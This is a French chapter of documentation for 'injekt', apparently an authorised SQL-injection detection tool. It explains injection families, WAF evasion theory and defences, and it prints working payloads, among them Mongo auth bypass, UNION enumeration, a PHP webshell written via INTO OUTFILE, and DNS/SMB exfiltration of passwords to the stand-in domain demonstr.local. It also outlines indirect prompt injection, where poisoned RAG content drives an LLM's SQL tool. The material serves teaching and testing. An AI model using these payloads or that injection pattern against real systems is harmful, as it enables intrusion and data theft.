# 10 — La science de l'injection SQLi (du basique au complexe, 2026)

> Doc théorique + cartographie `injekt`. Usage **autorisé uniquement** (lab ou
> autorisation écrite explicite) — cf. `README.md`, `docs/OPSEC.md`.
>
> Cross-refs : chap. 3 (scan), 4 (évasion), 5 (exploitation), `RESEARCH_NOTES.md`,
> `docs/plan-generative-ai-suggest.md`, `docs/ROADMAP-v1.0.md`.

1. [Le fondement : code vs données](#101-le-fondement--code-vs-données)
2. [Familles d'injection par canal (les 8 de `injekt`)](#102-familles-dinjection-par-canal)
3. [Second-ordre (stored SQLi) — le poison à retardement](#103-second-ordre-stored-sqli--le-poison-à-retardement)
4. [Échelle d'impact : extraction → RCE](#104-échelle-dimpact--extraction--rce)
5. [Évasion WAF : la théorie de l'asymétrie](#105-évasion-waf--la-théorie-de-lasymétrie)
6. [L'offensive 2026-2027 : ce qui change réellement](#106-loffensive-2026-2027--ce-qui-change-réellement)
7. [Défense (le strict nécessaire)](#107-défense--le-strict-nécessaire)
8. [Cartographie `injekt` — exacte, 2026-10](#108-cartographie-injekt--exacte-2026-10)
9. [Suite : priorités de science](#109-suite--priorités-de-science)

---

## 10.1 Le fondement : code vs données

Le SQLi n'est pas d'abord un « bug de filtrage ». C'est un bug de **suites de
caractères** : une entrée destinée à la couche *données* franchit la barrière
et atteint la couche *syntaxe*. Dans le moteur de BDD, ce qui se joue :

```
chaîne SQL   →  lexing (tokens)  →  parsing (AST)  →  plan d'exécution
                      ↑ c'est ICI que la donnée devient code
```

Trois ingrédients suffisent :

| Ingrédient | Exemple |
|---|---|
| Un caractère « fence » qui ferme prématurément la zone de données | `'` (string), `` ` `` (backtick MySQL), `)` |
| Un point de concaténation entre requête et entrée utilisateur | `format!("… WHERE id = {}", user_input)` |
| Un effet observable pilotable par la syntaxe | diff page, latence, erreur reflétée, `;` |

La seule frontière syntaxique fiable est le **paramétrage** (prepared
statements) : l'AST est compilé depuis un gabarit fixe, la valeur circule par
un canal séparé (`?`/`$1`), et le lexer ne re-tokenise **jamais** la valeur.
Un payload `admin'--` passé en paramètre paramétré reste un littéral de
9 caractères. Tout le reste (échappement, WAF, listes noires) réduit la
surface sans fermer la barrière code/données.

**Conséquence pour `injekt`** : la détection ne cherche pas « un payload
malveillant » (aucun payload n'est malveillant *intrinsèquement*), elle mesure
une **mutation d'oracle** — différentiel TRUE/FALSE, latence, erreur — c'est-à-dire
que le moteur observe le *comportement du parser*, pas la *signature du texte*.
C'est toute la différence avec un filtre par regex.

---

## 10.2 Familles d'injection par canal

`injekt` implémente **8 familles** (`src/techniques/`). Table synthèse + fondement
par famille ; détails commandes au chap. 3.3.

| # | Famille | Canal d'information | Idée |
|---|---|---|---|
| 1 | `boolean` | contenu de la page | oracle différentiel : la réponse révèle la valeur de vérité de la condition |
| 2 | `time` | latence | oracle temporel, seuil `baseline + 2σ` |
| 3 | `error` | erreurs reflétées | détourner le canal d'exception pour faire remonter la donnée |
| 4 | `union` | contenu page (joint) | fusionner les colonnes d'une 2e SELECT dans le flux légitime |
| 5 | `stacked` | marqueur reflété | 2e commande après `;` (garde SELECT-only) |
| 6 | `oob` | DNS/HTTP hors bande | le serveur BDD exfiltre lui-même la donnée dans un sous-domaine |
| 7 | `json` | boolean + erreur sur fonctions JSON | même oracle, surfaces natives `JSON_*` |
| 8 | `nosql` | boolean + erreur Mongo | la *mutation de prédicat* par opérateurs `$gt/$ne/$regex/$where` |

### 10.2.1 boolean — l'oracle différentiel

Poser une paire de questions (vrai/faux) de même forme syntaxique :

```sql
' OR 'a'='a'-- -   -- TRUE
' OR 'a'='b'-- -   -- FALSE
```

Le payload n'est pas « dangereux » en lui-même — c'est **la différence entre
deux réponses** qui prouve qu'une condition a été exécutée. Trois
instruments mesurent cela :

- **Diff** : Levenshtein + Jaccard sur la réponse (`DiffResult{similarity,
  time_delta,confidence}`) ✓ tolérant au bruit de contenu dynamique ;
- **Baseline 3-5 requêtes** → SHA-256 + moyenne/σ + fingerprint WAF/CDN :
  on mesure la variance *du bruit*, jamais la signature ;
- **Confirmation inversée, min 3 essais** : rejouer la paire en swap +
  prédiction causale (un diff réel est prévisible *dans le sens* TRUE/FALSE).

Détail 2026 : pour un endpoint d'auth, TRUE = session ouverte et FALSE = échec,
`confirm_either` (pass swap) confirme et tague `inverted`
(`tests/integration_login_bypass.rs`, scénario CVE pré-auth type 2026).

### 10.2.2 time — l'oracle statistique

Quand la page ne change **jamais** (aveugle-invisible), le seul canal est le
temps. Quatre dialectes :

```sql
SLEEP(5)              -- MySQL      | BENCHMARK(1000000,MD5(1))  -- MySQL (coût CPU)
pg_sleep(5)           -- Postgres   | WAITFOR DELAY '0:0:5'      -- MSSQL
DBMS_PIPE.RECEIVE_MESSAGE('a',5)    -- Oracle
```

Toute la science est là : « lent » n'est pas un finding. C'est :

- baseline (moyenne, σ, distribution de latence),
- seuil de détection **`baseline + 2σ`** (statistique, jamais une intuition),
- retry en cas de timeout réseau,
- veto si infra suspecte (429/503, `--ignore-code`).

`injekt` implémente strictement ça (`techniques/time`).

### 10.2.3 Extraction — l'inférence binaire

Extraire un octet coûte ≈ 7 questions booléennes (recherche binaire sur
`ASCII 32..126`) ; `src/extraction/` :

- 1 octet = un diff `OR (SELECT …) > x` → binaire oui/non ;
- contrôle : vérification finale par **longueur + checksum** (anti-corruption) ;
- budget borné, concurrence `buffer_unordered(threads)` ;
- données extraites = `SecretString` (zeroize à la sortie).

### 10.2.4 error — le canal d'exception

La donnée est poussée dans un **message d'exception** reflété, via un piège de
conversion/décomposition :

```sql
EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()),0x7e))  -- MySQL : affiche '~8.0.36~'
CAST('x' AS <type_invalide>)                          -- conversion cassée typée
```

`techniques/error` : regex de messages versionnés par DBMS, masquage des erreurs
reflétées dans le diff.
NB : sans réflexion, pas d'oracle — ces payloads ne servent que sur des stacks
« qui parlent » ; les architectures **ne renvoyant jamais l'erreur** les rendent
muetes (d'où l'intérêt de `boolean`/`time`/`oob`).

### 10.2.5 union — l'assemblage de colonnes

La requête légitime est exécutée normalement, suspendue à ses colonnes :

```sql
1' ORDER BY 3-- -          -- erreur si < 3 colonnes → énumération
1' UNION SELECT NULL,NULL,NULL-- -   -- padding NULL (compatibilité de types)
```

Le catalogage vient ensuite : `information_schema` (MySQL/Postgres) /
`pg_catalog` (Postgres) / `sys.objects` (MSSQL).
Détection : `techniques/union` (ORDER BY) ; exploitation `--dbs/--tables/
--columns/--dump` (chap. 5).

### 10.2.6 oob — hors bande (aspirer quand la fenêtre est fermée)

Aucun canal application n'est disponibles ? On en fabrique un :

```sql
-- MySQL/MSSQL Windows : résolution SMB/DNS de data.demonstr.local
SELECT LOAD_FILE(CONCAT('\\\\',(SELECT password),'.demonstr.local\\a'));
xp_dirtree '\\\\data.demonstr.local\\a'
-- Postgres : COPY TO PROGRAM / dblink  -- Oracle : UTL_HTTP / UTL_INADDR
```

L'attaquant lit ses logs DNS (collaborateur). `injekt` :
`techniques/oob` **OPT-IN** (`--oob-domain`, token `<token>.<domain>`,
polling collaborateur `--oob-poll-url` avec placeholder `{token}`) —
**jamais** de finding sans preuve collaborateur.

### 10.2.7 json — les surfaces natives JSON

Pendant 25 ans, les payloads JSON étaient typés *chaîne*. Désormais, on abuse
des fonctions **d'extraction** natives — même oracle boolean/erreur, autre
syntaxe par DBMS :

```sql
JSON_EXTRACT(col, CONCAT('$[', user_input::int, ']'))  -- MySQL 8.x
data->'status' >= 1                                    -- Postgres 15+
JSON_VALUE(col, '$.a')                                 -- MSSQL 2022 / Oracle 21c
```

`techniques/json` (ADR 0008) : double canal boolean + erreur JSON
(`Invalid JSON text`, Msg 13609, ORA-40442…). Le vecteur 2026 réaliste
(configs d'API, blobs de contexte, champs d'app IA).

### 10.2.8 nosql — la mutation de prédicat (opérateurs Mongo)

Le REST reçoit un JSON et le transmet **brut** au SGBD :

```json
{"user": {"$gt": ""}, "pass": {"$gt": ""}}    -- login sans connaître le mdp
{"$ne": null} / {"$regex": ".*"} / {"$where": "((("}
```

Rien n'est « injecté » : le **prédicat** est remplacé. `injekt`
`techniques/nosql` : 5 paires TRUE/FALSE (chaîne *et* forme opérateur JSON
selon canal) + sondes d'erreur `$where` (`SyntaxError`,
`unknown operator`) scrutées par le détecteur.

---

## 10.3 Second-ordre (stored SQLi) — le poison à retardement

La famille **la plus furtive** : la charge est **stockée** par code correct
(paramétré), puis se déclenche quand ce même champ est **réutilisé** dans une
autre requête construite par concaténation (rapport, back-office, script admin).

Exemple canonique :

```sql
-- 1) S'inscrire avec username = `admin'--` — INSERT paramétré,
--    aucun blocage, la chaîne dort en base :
INSERT INTO users (username, password) VALUES (?, ?);  -- stocke littéralement `admin'--`

-- 2) Plus tard : le back-office reconstruit par concaténation depuis la base,
--    pour le changement de mot de passe :
UPDATE users SET password='NewPass' WHERE username='admin'--'
--                                                        ^ le `--` commente le reste
--    → le mot de passe du VRAI compte `admin` est réécrit.
```

Deux traits rendent le vecteur dur :

1. **Séparation spatiale/temporelle** : la requête injectrice ≠ la requête
   vulnérable. Aucun proxy ni WAF ne corrèle les deux ; le payload ne passe
   même pas par le même compte HTTP.
2. **Confiance native en la BDD** : « c'est notre base, c'est sûr » — la valeur
   interne n'est pas paramétrée au réusage.

**En 2026-10, `injekt` ne détecte pas ce vecteur** (cf. §10.8) : rien dans le
code ne stocke un marqueur pour le rejouer sur un autre flux. Le chemin manuel
le plus proche : `recon import` d'un candidat préparé + re-scan de
l'endpoint consommateur (→ §10.9, priorité 1).

---

## 10.4 Échelle d'impact : extraction → RCE

Les familles du §10.2 donnent l'**extraction**. L'échelle maximale dépend des
privilèges du compte app — modulo les garde-fous :

| Niveau | Exemples |
|---|---|
| 1. Schéma | `information_schema`, `--dbs / --tables / --columns / --dump` |
| 2. Fichiers (lecture) | MySQL `LOAD_FILE('/etc/passwd')` |
| 3. Fichiers (écriture → RCE via webserver) | `UNION SELECT '<?php system($_GET[c]); ?>' INTO OUTFILE '/var/www/html/x.php'` |
| 4. Commandes OS | MSSQL `xp_cmdshell '…'` |
| 5. Mouvement latéral | MSSQL *linked servers*, FDW Postgres, Oracle `DBMS_*` |

À 2026-10, `injekt` **s'arrête volontairement** à la détection + extraction
SELECT-only :

- `stacked` est protégé par un **garde SELECT-only** (marker `; SELECT`) ;
- le validateur IA (`src/ai/validator.rs`) rejette `;` stacked / `xp_` /
  `EXEC` / `OUTFILE` / `LOAD_FILE` ;
- disclaimer assumé : « détection et extraction », pas « dégradation » —
  jamais d'arme sur une cible non couverte par l'autorisation signée.

---

## 10.5 Évasion WAF : la théorie de l'asymétrie

### 10.5.1 Le cadre — *impedance mismatch*

La requête traverse LB → WAF/CDN → application → SGBD. Chaque couche a son
propre **normalisateur** (URL-decode, HTML entity, base64, `%uXXXX`,
conversion charset…). Un payload 2026 moderne vit **dans l'écart entre deux
normalisateurs** — pas dans la syntaxe SQL brute.

Les catégories (implémentées en tampers, cf. chap. 4) :

| Catégorie | Mécanisme | Exemples |
|---|---|---|
| Normalisation (double décodage) | le WAF décode 1 couche, l'app une 2e | `doubleurlencode`, `hexencode`, `overlongutf8`, `unicodeencode` (stacks IIS/ASP) |
| Lexique SQL accepté par le parser | fusion de tokens légitimes | `space2comment` (`SE/**/LECT`), `versionedcomment` (`/*!50000SELECT*/` MySQL only), `randomcase` |
| Types des séparateurs | le parser SQL accepte `09/0a/0c/( )` comme espace | `space2tab/newline/paren/randomblank` |
| Substitution syntaxique | matcher un autre token équivalent | `equaltolike` (`=` → ` LIKE `), `numericobfuscate` (`1` → `0x31`), version `versionedfuzz` |
| HTTP-level | le WAF lit la première occurrence / le body entier, l'app le ré-assemble | `--hpp` (`?id=1&id=PAYLOAD`), `--chunked` (body streamé), `linecomment` (terminateur) |
| Contexte fond | payload opère depuis autre contexte | `space2dash` (MSSQL/SQLite), comment-terminateur `%23`, `--prefix/--suffix` |

### 10.5.2 La limite mathématique

Les regex d'un WAF sont des automates **réguliers** (langages réguliers,
type 3 de Chomsky) ; le SQL est hors-contexte (type 2) — implémenté en
pratique comme une CFG + analyse *token-level* par le SGBD. Trois conséquences :

1. **Nesting** : l'empilement de parenthèses `((…))` de profondeur *n* n'est
   pas un langage régulier — un pattern-matcher limite la profondeur qu'il
   couvre, jamais les payloads qui la dépassent. Les WAF modernes aplanissent
   les tokens (normalisation du lexique) — mais cette normalisation **ne peut
   pas couvrir toutes les chaînes** sans embarquer un parser SQL complet.
2. **Tokenizer avant matcher** : un SGBD résout la tokenisation selon les
   **règles de sa grammaire**, un regex n'en voit qu'un sous-ensemble. C'est
   l'axe où la recherche d'asymétrie est féconde : chaque tamper de la table
   §10.5.1 fabrique une *chaîne que le regex ne reconnaît pas encore comme
   un token*, mais que le SGBD reconstitue.
3. **ReDoS / fail-open** : les moteurs PCRE à backtracking (WAF basiques) se
   saturent sur payload obtus ; les moteurs modernes (RE2, Hyperscan) sont
   linéaires mais le fail-open au LB/LB-cloud reste un choix opérationnel.

La défense correspondante (symétrique) :

- libinjection (embarqué dans ModSecurity) : **token fingerprinting** SQL —
  la première étape industrialisée vers le « WAF sémantique » ;
- WAF sémantiques modernes : reconstruire l'**AST** et vérifier le *changement
  structurel* vs la requête attendue ;
- RASP : blocage **dans le runtime** (Node/Java/.NET), au moment de l'appel
  au driver SGBD — toute obfuscation a été résolue à ce stade.

Point important : `injekt` **ne simule pas de WAF sémantique** — les tampers
décrivent des familles de transformations, pas un modèle prédictif du WAF
cible (→ §10.9, priorité 5).

### 10.5.3 Conclusion

Deux leçons : (a) un WAF *réellement* sémantique détectera les payloads
obfusqués — l'échelle du coût d'évasion monte ; (b) pour l'opérateur, la
priorité reste la méthode (progressive, auto sur blocage, chap. 4), jamais
l'encodage hasardeux (`--skip-urlencode` sans raison, `base64encode` en
aveugle casse les différentiels boolean).

---

## 10.6 L'offensive 2026-2027 : ce qui change réellement

Constat : le SQL n'a pas changé. Le *harness* technologique (LLM, oracles,
architecture réseau) — oui. Quatre axes, chacun avec son statut `injekt`.

### 10.6.1 Agentification — le SQLi comme sous-agent

Les frameworks autonomes (recon→scan→exploit) utilisent le LLM comme
*driver* : il itère sur les échecs (status, latence, corps) et **conduit le
plan** sans dictionnaire. Trois limites balisées en 2026 :

- l'agent LLM ne remplace pas un oracle statistique déterministe (la
  baseline reste irremplaçable) ;
- le coût requête/instance est multiplié ;
- les murs OPSEC (jitter, proxy, zéro-persist) restent du ressort du tool
  sous-jacent, pas du LLM.

Pour `injekt` : **fournisseur MCP** — `injekt mcp` (chap. 7)
expose scan/recon à un agent externe (Claude Code, Codex, OpenCode…).
Décision figée en 2026-09 (`docs/plan-generative-ai-suggest.md`) :
« **LLM autonome interdit** » — `--ai-suggest` est un conseiller post-échec
opt-in (1 passage/param, validator strict, 0 génération live en détection).

### 10.6.2 Fuzzing adaptatif / RL — l'asymétrie apprise

Formulation canonique — l'attaque comme un jeu de recherche :

| Terme RL | Dans un fuzzer SQLi |
|---|---|
| État | payload courant + historique des réponses (statuts, latences, blocages) |
| Action | appliquer un tamper / muter le fence / changer le séparateur |
| Reward | TRUE/FALSE confirmé (+10), 500 (WAF passé mais syntaxe cassée, +1), 403 (bloqué, −1) |
| Policy | choisir la prochaine mutation |

Honnêteté : le **RL pur sur HTTP est coûteux** (des milliers d'essais réels) ;
l'approximation industrielle est une **recherche adaptative** (bandit / beam
search) sur un espace **discret** de mutations — pas un réseau de neurones.

`injekt` possède déjà des briques adjacentes :

- `src/generation/` : grammaire **déterministe** par noyau exprimable
  (`QuoteFence` × `Logic` × `Predicate` × `Separator`) seedée, incluant
  *spaceless* (`NoSpaceEq`/`NoSpaceLike`) et séparateurs tab/newline
  (`--generative`, `--max-generated`, OFF par défaut) ;
- `src/mutation/` (C5-tardif) : 4 familles à sémantique **préservée**
  (`quote_fence`, `paren_wrap`, `comment_swap`, `case_mix`), réutilisées
  *uniquement* pour reconfirmer des findings confirmés (`--confirm`),
  budget borné (≤ 4 variantes, ≤ 8 requêtes) ;
- `src/reasoning/knowledge.rs` : priors adaptatifs `(technique, dbms,
  context_class)` → boost bayésien **opt-in** (`--allow-knowledge`) ;
  `src/reasoning/hypothesis.rs` : seuils calibrés (0.85 / 0.70, réfutation
  < 0.04) ;
- `--ai-suggest` : conseiller **post-échec/WAF-block** (OpenAI / Anthropic) ;
- feedback filtre live : streak `400` → prioriser la dimension filtrée
  (espace → spaceless natif au lieu de tamper à l'aveugle).

Ce qui manque (→ §10.9, priorité 2) : une **politique de sélection en run**
(UCB/beam sur l'espace `tamper × fence × separator`, reward = confirmation).
Aujourd'hui la sélection reste « original + chaque single + chaîne complète »,
déterministe.

### 10.6.3 Polyglottes multi-parser

Un payload construit pour être lu par trois parser (*LB/WAF → app → SGBD*)
où chaque couche choisit un dialecte différent. `injekt` couvre la surface
**HTTP-level** : `--hpp` (WAF lit 1re occurrence, l'app la dernière),
`--chunked` (signature de longueur contournée) et bodies JSON profonds
(`json:` paths, XML tags, multipart). Les couches *« app IA »* restent
hors scope (§10.6.5).

### 10.6.4 Timing micro-statistique — au-delà de `SLEEP(5)`

L'idée : `SLEEP(5)` est bruité et rate-limité ; l'oracle 2026 cherche
l'**agrégation statistique** sur beaucoup de requêtes (delta en ms), avec
le parallélisme HTTP/3 (QUIC) comme *instrument*. État des lieux :

- `injekt` a les fondations (baseline σ + concurrence bornée), mais pas
  HTTP/3 (client `reqwest` : h3 expérimental, derrière `quinn`) ni
  l'oracle micro-timing (latence différentielle < σ) ;
- OPSEC oblige : un oracle micro-timing agressif (beaucoup de requêtes court
  delta) va contre le **jitter** (750±250 ms) et le rate-limit (10 r/s) —
  c'est une **tension assumée**, pas une feature à rusher.

### 10.6.5 Applications LLM/RAG — une nouvelle couche, pas du SQLi

Repère 2025-2026 : OWASP LLM Top 10 2025 → `LLM01 = Prompt Injection`.
L'attaque dite indirecte a trois temps (documentée en recherche) :

1. **Empoisonnement de source** — un avis client contient des *instructions
   à l'attention du LLM* (en langage naturel, pas du SQL) ;
2. **Re-vectorisation** — la source est synchronisée en base vectorielle
   (pgvector, Pinecone…) ;
3. **Récupération + exécution** — un utilisateur légitime demande un
   résumé ; le LLM reçoit le texte en *contexte*, obéit, et appelle **son
   outil SQL** (tool-calling) avec des privilèges larges.

Le point de science : il n'y a **aucune injection SQL syntaxique** — l'attaque
est décalée d'un niveau (app/agent IA ; l'agent a déjà le droit d'appeler
l'outil SQL ; c'est le *contenu* qui le détourne). C'est hors scope
`injekt` (et ça ne lui appartient pas) ; briques pertinentes en marge :
`recon crawl` pour cartographier les endpoints LLM/GenAI, `techniques/nosql`
pour les stores Mongo associés, MCP pour l'audit collaboratif.
(À réévaluer une fois le paysage Agent/Tool standardisé.)

---

## 10.7 Défense (le strict nécessaire)

```
1. Requêtes paramétrées    — la SEULE frontière code/données fiable
2. Least privilege         — app: SELECT/INSERT/UPDATE sur ses tables,
                             jamais FILE/xp_*/compte admin
3. Pas d'erreur reflétée   — exceptions loggées côté serveur, jamais à l'écran
4. WAF sémantique / RASP   — pondération utile, jamais unique
5. SAST + raw-queries ORM sous marquage CI (Prisma $queryRaw, whereRaw, …)
6. Segmentation BDD        — par domaine applicatif, pas de moteur de recomposition
7. GénIA : tout agent LLM qui exécute du SQL (tool-calling) sous whitelist stricte
```

Cross-ref OWASP SQL Injection Prevention Cheat Sheet ; côté CI :
`injekt auto` (chap. 7) + `--output report.json` en gate de PR.

---

## 10.8 Cartographie `injekt` — exacte, 2026-10

| Concept (ce document) | Statut | Où / Flag | Remarques |
|---|---|---|---|
| Boolean différentiel | ✅ | `techniques/boolean` + Levenshtein/Jaccard | confirmation inversée, min 3 essais |
| Auth bypass (pass swap) | ✅ | `confirm_either` (`integration_login_bypass.rs`) | finding tag `inverted` |
| Time statistique | ✅ | `techniques/time`, seuil `baseline+2σ` | 4 dialectes + retry timeout |
| Error-based | ✅ | `techniques/error`, `EXTRACTVALUE/CONVERT/CAST` | regex d'erreurs versionnées par DBMS |
| Union / énumération | ✅ | `techniques/union` (ORDER BY) | exploitation chap. 5 |
| Stacked (SELECT-only) | ✅ | `techniques/stacked` | arme interdite par design |
| OOB | ✅ OPT-IN | `techniques/oob` + `--oob-domain`, `--oob-poll-url` | jamais de finding sans preuve collaborateur |
| JSON dual-canal | ✅ | `techniques/json` (ADR 0008) | MySQL 8.x / PG 15+ / MSSQL 2022 / Oracle 21c |
| NoSQL opérateurs Mongo | ✅ | `techniques/nosql` | `$gt/$ne/$regex/$where`, forme JSON native |
| Extraction binaire | ✅ | `src/extraction` (ASCII 32-126), `--extract` | longueur + checksum, `SecretString` |
| 24 tampers + presets | ✅ | `techniques/tamper` (chap. 4) | auto `space2comment,randomcase` si WAF bloqué |
| Tampers HTTP (HPP/chunked) | ✅ | `techniques/request_tamper` | `--hpp`, `--chunked` |
| Génération grammaticale | ✅ | `src/generation` (`--generative`, `--max-generated`) | spaceless, tab/nl, OFF par défaut |
| Mutation post-confirmation | ✅ | `src/mutation` (C5-tardif) | budget ≤ 4 variantes/8 requêtes, `--no-mutation` |
| Priors adaptatifs | ✅ OPT-IN | `src/reasoning/knowledge` (`--allow-knowledge`) | agrégats anonymes, jamais de cible |
| LLM conseiller post-échec | ✅ OPT-IN | `src/ai` (`--ai-suggest`, OpenAI/Anthropic) | 1 passage/param, validator strict |
| Pilotage agent externe | ✅ | `src/mcp` (`injekt mcp`) | stdio ; AI exclu du MCP (CLI-only) |
| **Second-ordre (stored)** | ❌ | — | chemin manuel via `recon import` ; §10.9/P1 |
| **HTTP/3 + micro-timing** | ❌ | — | `quinn`/h3 expérimental ; tension OPSEC ; §10.9/P3 |
| **Boucle adaptative en run (RL-like)** | ⚠ partiel | generation + mutation + knowledge + ai-suggest | pas de politique reward-driven; §10.9/P2 |
| **RAG / vector poisoning** | ❌ | hors scope SQLi | §10.6.5 |
| JA3 randomisation | ❌ documentée | `src/http/identity` | mitigation = proxy externe |
| RCE / arme | ❌ volontaire | stacked SELECT-only + validator IA | jamais arme sur cible non demandée |

Lecture honnête : `injekt` n'est pas un « outil LLM générique » ; c'est un
**instrument d'ingénierie de détection** avec des briques 2026 réelles
(grammaire paramétrique, mutation sémantique-préservée, priors bayésiens,
conseiller IA opt-in, MCP) et des **limites assumées** (RCE, agent autonome
= interdits par décision opérateur, cf. `docs/ROADMAP-v1.0.md`).

---

## 10.9 Suite : priorités de science

Aucune priorité engageable sans décision opérateur. Ordre suggéré, du plus
utile au plus futuriste :

1. **Second-ordre expérimental** (2 passes opt-in) : stocker un marqueur bénin
   via le param testé, puis re-scanner l'endpoint alimenté par ce champ
   (re-recon). Peu de code, forte valeur.
2. **Recherche adaptative de tampers** : bandit/UCB sur `(tamper × fence ×
   separator)`, reward = confirmation, prior initialisé par `knowledge.rs`.
   Sans ML, sans coût requête supplémentaire si budget borné.
3. **HTTP/3 + micro-timing** : à réévaluer une fois l'écosystème rust
   stabilisé (`quinn`, client h3) ; d'ici là, résoudre la tension OPSEC
   (jitter/rate-limit vs delta-ms) d'abord.
4. **Surfaces semi-structurées** : GraphQL (bodies JSON profonds,
   introspection en recon), arrays/documents… — les fondations
   JSON-processing existent déjà.
5. **Modélisation adversaire du WAF** (mirror AST) — recherche, pas v1.0.

### Références

- OWASP SQL Injection Prevention Cheat Sheet ; OWASP LLM Top 10 2025.
- PortSwigger Web Security Academy — SQLi (labs).
- PayloadsAllTheThings — SQLi ; tamper scripts de sqlmap/ghauri.
- libinjection (token fingerprinting SQL dans ModSecurity) : le point de
  départ industrialisé du WAF sémantique.
- `RESEARCH_NOTES.md` ; ADR 0005 (tamper), 0006 (OOB), 0007 (request
  tampers), 0008 (json) ; `docs/plan-generative-ai-suggest.md` ;
  `docs/ROADMAP-v1.0.md` ; chap. 3/4/5/7 du playbook.
